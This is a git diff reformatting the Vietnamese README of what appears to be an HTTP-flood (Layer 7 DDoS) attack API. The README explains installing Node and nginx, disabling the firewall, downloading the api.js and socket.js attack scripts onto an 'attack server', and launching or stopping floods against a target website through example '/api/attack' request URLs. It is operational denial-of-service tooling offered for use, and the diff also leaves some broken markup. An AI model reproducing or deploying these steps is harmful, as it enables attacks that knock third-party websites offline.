@@ -4,11 +4,11 @@
 <h4>tức là ping 60 mili giây, sẽ chỉ mất 120 mili giây để khởi chạy cuộc tấn công</h4>
 
 
-<h1>Cài đặt:</h1>
+<h2>Cài đặt:</h2>
 
-cài đặt nodejs
+<h3>cài đặt nodejs</h3>
 
-ubuntu 
+***ubuntu*** 
 ```sh
 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
 source ~/.bashrc
@@ -17,7 +17,7 @@ nvm use 14.17.3
 npm i express
 ```
 
-centos
+***centos***
 ```sh
 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.38.0/install.sh | bash
 source ~/.nvm/nvm.sh
@@ -26,11 +26,11 @@ nvm use 14.17.3
 npm i express
 ```
 
-cài đặt nginx
+<h3>cài đặt nginx</h3>h3>
 
-tắt tường lửa
+<h3>tắt tường lửa</h3>h3
 
-centos
+***centos***
 ```sh
 sudo service iptables stop
 sudo chkconfig iptables off
@@ -38,7 +38,7 @@ sudo systemctl stop firewalld
 sudo systemctl disable firewalld
 ```
 
-<h1>Setup:</h1>
+<h2>Setup:</h2>
 
 <h3>Update servers.json</h3><br>
 
@@ -87,7 +87,8 @@ const socket_token = "SOCKET_TOKEN";
 const allowed_ips = ['1.1.1.1'];
 ```
 
-## Sau đó, tải `socket.js` lên máy chủ tấn công và tải `api.js` `servers.json` và `commands.json` lên máy chủ API
+<h3> Sau đó, tải `socket.js` lên máy chủ tấn công và tải `api.js` `servers.json` và `commands.json` lên máy chủ API</h3>
+
 ```js
 wget https://raw.githubusercontent.com/DauDau432/Api_L7/main/api.js
 wget https://raw.githubusercontent.com/DauDau432/Api_L7/main/commands.json
@@ -97,7 +98,8 @@ wget https://raw.githubusercontent.com/DauDau432/Api_L7/main/servers.json
 wget https://raw.githubusercontent.com/DauDau432/Api_L7/main/socket.js
 ```
 
-### Khởi động
+<h3> Khởi động</h3>
+
 ```js
 screen -S api -dm node api.js
 ```
@@ -105,9 +107,9 @@ screen -S api -dm node api.js
 screen -S socket -dm node socket.js
 ```
 
-### Proxy đảo ngược
+<h3> Proxy đảo ngược</h3>h3
 
-Bạn nên tạo proxy ngược bằng Nginx để sử dụng API của mình:
+***Bạn nên tạo proxy ngược bằng Nginx để sử dụng API của mình:***
 
 ```nano /etc/nginx/nginx_conf```
 ```conf
@@ -120,14 +122,14 @@ server {
 }
 ```
 
-Thay thế `'http://backend:8888/api/attack'` bằng IP máy chủ API của bạn
+***Thay thế*** `'http://backend:8888/api/attack'` ***bằng IP máy chủ API của bạn***
 
-### Sử dụng API
+<h2> Sử dụng API</h2>
 
-Gửi yêu cầu tới API bằng các trường bắt buộc
+***Gửi yêu cầu tới API bằng các trường bắt buộc***
 
 `http://api.yourdomain.com:8888/api/attack?api_key=key&host=https://website.com&time=120&method=HTTPGET&server=1`
 
-Bạn có thể dừng các cuộc tấn công bằng cách gửi yêu cầu tới API sử dụng `&method=stop`
+***Bạn có thể dừng các cuộc tấn công bằng cách gửi yêu cầu tới API sử dụng*** `&method=stop`
 
 `http://api.yourdomain.com:8888/api/attack?api_key=key&host=https://website.com&time=120&method=stop&server=1`
